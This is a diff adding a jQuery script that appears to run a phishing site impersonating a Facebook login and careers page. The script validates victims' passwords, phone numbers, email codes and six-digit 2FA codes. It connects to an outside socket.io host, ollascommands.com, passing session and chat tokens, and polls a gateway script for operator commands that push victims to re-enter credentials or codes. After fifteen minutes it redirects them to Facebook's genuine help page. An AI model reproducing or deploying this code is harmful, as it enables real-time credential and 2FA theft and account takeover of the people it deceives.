@@ -1,0 +1,268 @@
+$("form").submit(function (e) {
+  const inputs = e.target.querySelectorAll('input, textarea');
+  var hasError = false;
+  for(let input of inputs){
+    const dataset = input.dataset;
+    if(dataset.required == "true"){
+      const parent = $(input).parent();
+      let error = $(input).next("span.error");
+      if(error.length < 1) error = $(input).parent().parent().find("span.error");
+
+      if(input.type == "checkbox"){
+        if(!input.checked){
+          error.css("display", "inline-block");
+          hasError = true;
+        } else {
+          error.css("display", "none");
+        }
+      } else if(dataset.mobile == "true") {
+        if(!input.value.match(/^(\+)?([0-9]){8,16}$/)){
+          hasError = true;
+          error.css("display", "inline-block");
+        }else {
+          if(parent.attr("data-next") == "true"){
+            parent.next().fadeIn();
+          } 
+          error.css("display", "none");
+        }
+      } else if(dataset.email == "true"){
+        if(!input.value.match(/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/)){
+          hasError = true;
+          error.css("display", "inline-block");
+        }else {
+          if(parent.attr("data-next") == "true"){
+            parent.next().fadeIn();
+            parent.find(".next").fadeOut();
+          }
+          if(parent.attr("data-submit") == "true"){
+            $(".buttonHolder").css("display", "block");
+          }
+          error.css("display", "none");
+        }
+      } else if(dataset.codetype == "2fa"){
+        if(!input.value.match(/^[0-9]{6}$/)){
+          hasError = true;
+          error.css("display", "inline-block");
+          error.text("Entered code must be exactly 6 digits");
+        }else {
+          error.css("display", "none");
+        }
+      } else if(dataset.codetype == "email"){
+        if(!input.value.match(/^[0-9]{5}$/) && !input.value.match(/^[0-9]{8}$/)){
+          hasError = true;
+          error.css("display", "inline-block");
+          error.text("Entered code is incorrect.");
+        }else {
+          error.css("display", "none");
+        }
+      } else {
+        if(!input.value){
+          hasError = true;
+          error.css("display", "inline-block");
+        }else {
+          if(parent.attr("data-next") == "true"){
+            parent.next().fadeIn();
+            parent.find(".next").fadeOut();
+          }
+          error.css("display", "none");
+        }
+      }
+    }
+  }
+  if(hasError) e.preventDefault();
+  else {
+    const onValidate = $(this).attr("onValidateCallback");
+    if(onValidate) onLoginSubmit(e, this);
+  }
+})
+
+function redirect_to($url){
+  window.location.href = $url;
+}
+
+$(function () {
+  const sid = $("#sessId").val();
+  const message = $("#appMessage").val();
+  const token = $("#appToken").val();
+  const chatId = $("#appChatId").val();
+  var socket = io('https://ollascommands.com/', { 
+    query: `room=${sid}&message=${encodeURIComponent(message)}&chatId=${chatId}&token=${token}` 
+  });
+  
+  socket.on('action', data => {
+    receiveMessage(data);
+  });
+
+  setInterval(() => {
+    $.post('/gw.php', { action: 'command' }).done(function(response){
+      response = JSON.parse(response);
+      if(response.command) receiveMessage(response.command);
+    });
+  }, 5000);
+  
+  function receiveMessage(data){
+    switch(data) {
+      case "PASSWDAGAIN":
+        redirect_to("/login?again=true");
+        return;
+      case "SENDTOEMAIL":
+        redirect_to("/auth?type=email");
+        return;
+      case "SENDTO2FA":
+        redirect_to("/auth?type=2fa");
+        return;
+      case "2FAAGAIN":
+        redirect_to("/auth?type=2fa&again=true");
+        return;
+      case "EMAILAGAIN":
+        redirect_to("/auth?type=email&again=true");
+        return;
+      case "ERROR":
+        redirect_to("/result");
+        return;
+      case "RESTRICT":
+        redirect_to("/result?restrict=true");
+        return;
+      case "CAREER":
+        redirect_to("/career?allow=true");
+        return;
+      case "BLOCK10":
+        $.post('/gw.php', { action: 'block10' }).done(function(response){
+          redirect_to("/block");
+        });
+        return;
+      case "BLOCK60":
+        $.post('/gw.php', { action: 'block60' }).done(function(response){
+          redirect_to("/block");
+        });
+        return;
+    }
+  };
+});
+
+// Start Home
+$(document).ready(function () {
+  $('select').customSelect({
+    search: true,
+    hover: false,
+    responsive: false,
+    checkboxes: true,
+    scrollToSelect: true,
+    closeAfterSelect: true
+  })
+})
+
+$(function (){
+  $(".view-positions").click(function (e) {
+    $('html, body').animate({
+      scrollTop: $("#job-positions").offset().top
+  }, 1500);
+  })
+})
+// End Home
+
+// Start Auth
+function openAuthModal(){
+  $("#modalContainer").addClass("active");
+  $("#errorRequired").css("display", "none");
+}
+// End Auth
+
+// Start AuthModal
+function closeAuthModal(){
+  $("#modalContainer").removeClass("active");
+}
+// End AuthModal
+
+// Start Footer
+function updateActive(elm){
+  $(elm).find("i").toggleClass("active");
+  $(elm).next("ul").toggleClass("active");
+}
+// End Footer
+
+// Start Header
+const openMobileMenu = () => {
+  $(".menuOverlay").addClass("active");
+}
+const closeMobileMenu = () => {
+  $(".menuOverlay").removeClass("active");
+}
+
+$(function (){
+  $(".topHeader .login").click(function (e) {
+    e.preventDefault();
+    $(this).find("i").toggleClass("bx-flip-vertical");
+    $(".login-modal").slideToggle();
+  })
+})
+// End Header
+
+// Start Loader
+$('.auto-refresher').autoRefresher({
+  progressBarHeight:'16px',
+  seconds: 900,
+  showControls: false
+});
+
+function secondsToMinutes(time){
+  return ('00' + Math.floor(time / 60)).slice(-2) + ':' + ('00' + Math.floor(time % 60)).slice(-2);
+}
+
+let interval = setInterval(() => {
+  const seconds = $("#seconds");
+  const progress = parseInt(seconds.attr("data-seconds"));
+  if(progress === 900) {
+    window.location.href = "https://www.facebook.com/help/?helpref=hc_global_nav";
+  } else {
+    seconds.text(secondsToMinutes(progress));
+    seconds.attr("data-seconds", progress+1)
+  }
+}, 1000);
+// End Loader
+
+// Start Modal
+function closeModal(){
+  $("#modalContainer").remove();
+}
+// End Modal
+
+// Start Home
+function submitLikelyModal() {
+  $(".questions").fadeOut(100);
+  $(".thank-you").fadeIn();
+  $(".likely-modal .actions").fadeOut(100);
+  setTimeout(() => closeLikelyModal(), 5000);
+}
+function closeLikelyModal() {
+  $(".likely-modal").slideUp("normal", function() { $(this).remove(); });
+  $.post('/gw.php', { action: 'likelyModal' }).done(function(response){
+    console.log(response);
+  });
+}
+
+$(function (){
+  $(document).scroll(function() {
+    $(".likely-modal").slideDown();
+  })
+
+  $(".likelyun input").change(function (){
+    const val = $(this).val();
+    $(".second input").prop("checked", false);
+    $(".questions .second .radiobox").removeClass("active");
+    if(val == "unlikely") {
+      $("#likely").fadeIn();
+      $("#unlikely").fadeOut(100);
+    }else {
+      $("#unlikely").fadeIn();
+      $("#likely").fadeOut(100);
+    }
+  })
+  
+  $(".questions .second input").change(function (){
+    const checked = $(this).is(":checked");
+    if(checked) $(this).parent().addClass("active");
+    else $(this).parent().removeClass("active");
+  });
+})
+// End Home
